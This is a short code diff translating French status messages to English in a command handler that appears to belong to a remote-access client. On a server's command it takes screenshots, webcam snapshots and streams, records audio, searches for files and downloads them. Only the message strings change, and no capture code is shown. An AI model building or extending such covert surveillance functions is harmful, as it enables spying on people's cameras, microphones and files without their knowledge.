@@ -71,7 +71,7 @@ def handle_server_command(message: dict, conn: socket.socket) -> dict | None:
 
     elif command == "screenshot":
         data = actions.take_screenshot()
-        return {"type": "command_result", "command": "screenshot", "data": data, "output": "Screenshot pris."}
+        return {"type": "command_result", "command": "screenshot", "data": data, "output": "Screenshot taken."}
 
     elif command == "search":
         filename = message.get("filename", "")
@@ -89,7 +89,7 @@ def handle_server_command(message: dict, conn: socket.socket) -> dict | None:
             "type": "command_result",
             "command": "webcam_snapshot",
             "data": data,
-            "output": "Snapshot webcam pris.",
+            "output": "Webcam snapshot taken.",
         }
 
     elif command == "webcam_stream":
@@ -103,7 +103,7 @@ def handle_server_command(message: dict, conn: socket.socket) -> dict | None:
             "type": "command_result",
             "command": "record_audio",
             "data": data,
-            "output": "Audio enregistré.",
+            "output": "Audio recorded.",
         }
 
     elif command == "download":
